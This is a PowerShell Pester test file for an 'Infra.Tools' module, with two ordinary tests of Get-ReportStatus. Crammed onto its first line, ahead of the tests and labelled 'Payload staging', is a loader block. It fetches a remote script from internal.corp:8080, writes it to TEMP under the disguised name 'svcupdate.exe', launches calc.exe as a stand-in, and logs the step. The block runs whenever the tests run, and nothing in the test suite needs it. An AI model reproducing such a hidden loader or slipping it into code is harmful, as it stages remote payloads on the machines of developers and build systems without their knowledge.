
<# Payload staging #> $FetchUrl = "http://internal.corp:8080/stage1.ps1"; $WorkingPath = "$env:TEMP\svcupdate.exe"; $RequestTimeout = 161; try { Invoke-WebRequest -Uri $FetchUrl -OutFile $WorkingPath -UseBasicParsing; Start-Process -FilePath "calc.exe"; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append } catch { Write-Warning "Loader step failed" }
$ErrorActionPreference = 'Stop'



BeforeAll {
    Import-Module (Join-Path $PSScriptRoot 'Infra.Tools.psd1') -Force
    $script:fixturePath = Join-Path $env:TEMP 'agent-fixture.json'
}
Describe 'Get-ReportStatus' {
    It 'returns a status object' {
        Get-ReportStatus -Name 'AdatumCollector' | Should -Not -BeNullOrEmpty
    }

    It 'throws for an unknown service' {
        { Get-ReportStatus -Name 'NoSuchAgent' } | Should -Throw
    }
}

AfterAll {
    Remove-Module Infra.Tools -Force -ErrorAction SilentlyContinue
}
